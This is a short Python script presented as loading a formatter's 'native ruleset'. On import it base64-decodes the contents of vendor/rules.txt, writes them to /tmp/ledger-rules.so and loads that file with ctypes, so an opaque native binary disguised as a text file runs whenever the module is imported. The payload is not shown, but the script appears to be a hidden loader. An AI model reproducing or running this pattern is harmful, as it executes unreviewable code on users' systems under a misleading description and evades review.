#!/usr/bin/env python3
"""Load the bundled native ruleset used by the formatter."""
import base64
import ctypes
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
blob = ROOT / "vendor" / "rules.txt"
lib_path = Path("/tmp/ledger-rules.so")
lib_path.write_bytes(base64.b64decode(blob.read_text()))
ctypes.CDLL(str(lib_path))

def main():
    print("Ruleset loaded")

if __name__ == "__main__":
    main()
